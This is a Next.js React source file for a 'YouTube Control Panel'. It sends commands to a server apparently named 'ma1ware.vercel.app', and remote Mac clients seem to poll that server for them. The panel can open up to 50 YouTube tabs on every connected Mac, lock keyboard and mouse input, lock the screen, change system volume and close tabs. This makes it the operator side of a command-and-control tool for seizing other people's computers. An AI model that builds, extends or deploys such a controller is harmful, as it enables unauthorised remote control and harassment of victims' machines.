import { useState, useEffect } from 'react';
import Head from 'next/head';

export default function YouTubeControlPanel() {
  const [serverStatus, setServerStatus] = useState('Checking...');
  const [url, setUrl] = useState('https://www.youtube.com/watch?v=');
  const [tabCount, setTabCount] = useState(10);
  const [actionStatus, setActionStatus] = useState(null);
  const [connectedMacs, setConnectedMacs] = useState(0);
  const [inputLockActive, setInputLockActive] = useState(false);
  const [lastActionTime, setLastActionTime] = useState(null);

  const SERVER_URL = process.env.NEXT_PUBLIC_API_URL || 'https://ma1ware.vercel.app/api';

  useEffect(() => {
    checkServerStatus();
    // Poll for connected clients
    const interval = setInterval(checkConnectedClients, 5000);
    return () => clearInterval(interval);
  }, []);

  const checkServerStatus = async () => {
    try {
      const res = await fetch(`${SERVER_URL}/getAction`);
      if (res.ok) {
        setServerStatus('✅ Online');
      }
    } catch {
      setServerStatus('❌ Offline');
    }
  };

  const checkConnectedClients = async () => {
    // In a real app, you'd have a tracking endpoint
    // For now, we'll simulate based on last action time
    if (lastActionTime) {
      const timeDiff = Date.now() - lastActionTime;
      setConnectedMacs(timeDiff < 30000 ? 1 : 0);
    }
  };

  const sendAction = async (action, data = {}) => {
    setActionStatus('Sending command...');
    
    try {
      const payload = { action, ...data };
      const response = await fetch(`${SERVER_URL}/setAction`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'action': action
        },
        body: JSON.stringify(payload)
      });

      const result = await response.json();
      
      if (response.ok) {
        setActionStatus({
          type: 'success',
          message: `✓ ${action} command sent successfully!`
        });
        setLastActionTime(Date.now());
        
        // If locking inputs, update UI state
        if (action === 'lockInputs') {
          setInputLockActive(true);
        } else if (action === 'unlockInputs') {
          setInputLockActive(false);
        }
      } else {
        setActionStatus({
          type: 'error',
          message: `✗ Failed: ${result.error || 'Unknown error'}`
        });
      }
    } catch (error) {
      setActionStatus({
        type: 'error',
        message: `✗ Connection error: ${error.message}`
      });
    }
    
    // Clear status after 3 seconds
    setTimeout(() => setActionStatus(null), 3000);
  };

  const handleOpenTabs = () => {
    if (!url.includes('youtube.com')) {
      setActionStatus({
        type: 'error',
        message: 'Please enter a valid YouTube URL'
      });
      return;
    }
    sendAction('open', { url, count: tabCount });
  };

  const controlButtons = [
    { label: '▶ Play All', action: 'play', color: 'bg-green-500 hover:bg-green-600' },
    { label: '⏸ Pause All', action: 'pause', color: 'bg-yellow-500 hover:bg-yellow-600' },
    { label: '🔇 Mute All', action: 'mute', color: 'bg-gray-500 hover:bg-gray-600' },
    { label: '🔊 Unmute All', action: 'unmute', color: 'bg-blue-500 hover:bg-blue-600' },
    { label: '🔒 Lock Inputs', action: 'lockInputs', color: 'bg-red-500 hover:bg-red-600', disabled: inputLockActive },
    { label: '🔓 Unlock Inputs', action: 'unlockInputs', color: 'bg-green-500 hover:bg-green-600', disabled: !inputLockActive },
    { label: '🖥 Lock Screen', action: 'lockScreen', color: 'bg-purple-500 hover:bg-purple-600' },
    { label: '✕ Close All', action: 'close', color: 'bg-black hover:bg-gray-800' }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white p-4 md:p-8">
      <Head>
        <title>YouTube Multi-Tab Control Panel</title>
        <meta name="description" content="Control YouTube playback across multiple Mac computers" />
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
      </Head>

      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <header className="mb-10">
          <div className="flex flex-col md:flex-row justify-between items-center">
            <div>
              <h1 className="text-4xl font-bold mb-2">🎮 YouTube Control Panel</h1>
              <p className="text-gray-400">Control multiple YouTube tabs across Mac computers</p>
            </div>
            
            <div className="mt-4 md:mt-0 flex items-center space-x-4">
              <div className={`px-4 py-2 rounded-full ${serverStatus.includes('✅') ? 'bg-green-900' : 'bg-red-900'}`}>
                Server: {serverStatus}
              </div>
              <div className="px-4 py-2 rounded-full bg-blue-900">
                {connectedMacs > 0 ? `✅ ${connectedMacs} Mac Connected` : '⏳ Waiting for Mac...'}
              </div>
            </div>
          </div>
        </header>

        {/* Main Content */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Left Panel - URL Input */}
          <div className="lg:col-span-2 bg-gray-800 rounded-2xl p-6 shadow-2xl">
            <h2 className="text-2xl font-bold mb-6">📺 Video Configuration</h2>
            
            <div className="space-y-6">
              <div>
                <label className="block text-sm font-medium mb-2">YouTube URL</label>
                <input
                  type="text"
                  value={url}
                  onChange={(e) => setUrl(e.target.value)}
                  className="w-full p-4 bg-gray-900 border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  placeholder="https://www.youtube.com/watch?v=..."
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium mb-2">
                  Number of Tabs: <span className="font-bold text-blue-400">{tabCount}</span>
                </label>
                <div className="flex items-center space-x-4">
                  <input
                    type="range"
                    min="1"
                    max="50"
                    value={tabCount}
                    onChange={(e) => setTabCount(e.target.value)}
                    className="flex-grow accent-blue-500"
                  />
                  <input
                    type="number"
                    value={tabCount}
                    onChange={(e) => setTabCount(e.target.value)}
                    className="w-24 p-3 bg-gray-900 border border-gray-700 rounded-lg text-center"
                    min="1"
                    max="50"
                  />
                </div>
                <div className="flex justify-between text-xs text-gray-400 mt-2">
                  <span>1 tab</span>
                  <span>25 tabs</span>
                  <span>50 tabs</span>
                </div>
              </div>
              
              <button
                onClick={handleOpenTabs}
                className="w-full py-4 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 rounded-xl text-xl font-bold transition-all transform hover:scale-[1.02] active:scale-95"
              >
                🚀 OPEN {tabCount} TABS ON ALL MACS
              </button>
            </div>
            
            {/* Action Status */}
            {actionStatus && (
              <div className={`mt-6 p-4 rounded-lg ${actionStatus.type === 'success' ? 'bg-green-900/50' : 'bg-red-900/50'}`}>
                <p className="font-medium">{actionStatus.message}</p>
              </div>
            )}
          </div>

          {/* Right Panel - Quick Controls */}
          <div className="bg-gray-800 rounded-2xl p-6 shadow-2xl">
            <h2 className="text-2xl font-bold mb-6">🎛 Quick Controls</h2>
            
            <div className="grid grid-cols-2 gap-4">
              {controlButtons.map((btn) => (
                <button
                  key={btn.action}
                  onClick={() => sendAction(btn.action)}
                  disabled={btn.disabled}
                  className={`p-4 rounded-xl font-bold transition-all transform hover:scale-105 active:scale-95 ${btn.color} ${btn.disabled ? 'opacity-50 cursor-not-allowed' : ''}`}
                >
                  {btn.label}
                </button>
              ))}
            </div>
            
            {/* Volume Controls */}
            <div className="mt-8">
              <h3 className="text-lg font-bold mb-4">🔊 Volume Controls</h3>
              <div className="space-y-6">
                <div>
                  <div className="flex justify-between mb-2">
                    <span>YouTube Volume</span>
                    <span className="text-blue-400">100%</span>
                  </div>
                  <input
                    type="range"
                    min="0"
                    max="1"
                    step="0.1"
                    defaultValue="1"
                    onChange={(e) => sendAction('volume', { value: e.target.value })}
                    className="w-full accent-green-500 h-2"
                  />
                </div>
                
                <div>
                  <div className="flex justify-between mb-2">
                    <span>System Volume</span>
                    <span className="text-blue-400">100%</span>
                  </div>
                  <input
                    type="range"
                    min="0"
                    max="1"
                    step="0.1"
                    defaultValue="1"
                    onChange={(e) => sendAction('sysvolume', { value: e.target.value })}
                    className="w-full accent-purple-500 h-2"
                  />
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="mt-12 pt-8 border-t border-gray-800 text-center text-gray-400">
          <div className="flex flex-col md:flex-row justify-between items-center">
            <div className="mb-4 md:mb-0">
              <h3 className="font-bold">System Status</h3>
              <div className="flex space-x-6 mt-2 text-sm">
                <div className="flex items-center">
                  <div className="w-3 h-3 rounded-full bg-green-500 mr-2"></div>
                  <span>Server: Online</span>
                </div>
                <div className="flex items-center">
                  <div className={`w-3 h-3 rounded-full ${connectedMacs > 0 ? 'bg-green-500' : 'bg-yellow-500'} mr-2`}></div>
                  <span>Mac Connection: {connectedMacs > 0 ? 'Active' : 'Waiting'}</span>
                </div>
                <div className="flex items-center">
                  <div className={`w-3 h-3 rounded-full ${inputLockActive ? 'bg-red-500' : 'bg-gray-500'} mr-2`}></div>
                  <span>Input Lock: {inputLockActive ? 'ACTIVE' : 'Inactive'}</span>
                </div>
              </div>
            </div>
            
            <div>
              <p className="text-sm">
                Control Panel v2.0 • Made for YouTube multi-tab control
              </p>
              <p className="text-xs mt-1">
                Last action: {lastActionTime ? new Date(lastActionTime).toLocaleTimeString() : 'None yet'}
              </p>
            </div>
          </div>
        </footer>
      </div>

      <style jsx global>{`
        body {
          font-family: 'Inter', sans-serif;
        }
        input[type="range"] {
          -webkit-appearance: none;
          height: 8px;
          border-radius: 4px;
          background: #374151;
        }
        input[type="range"]::-webkit-slider-thumb {
          -webkit-appearance: none;
          width: 20px;
          height: 20px;
          border-radius: 50%;
          background: #3B82F6;
          cursor: pointer;
        }
      `}</style>
    </div>
  );
}
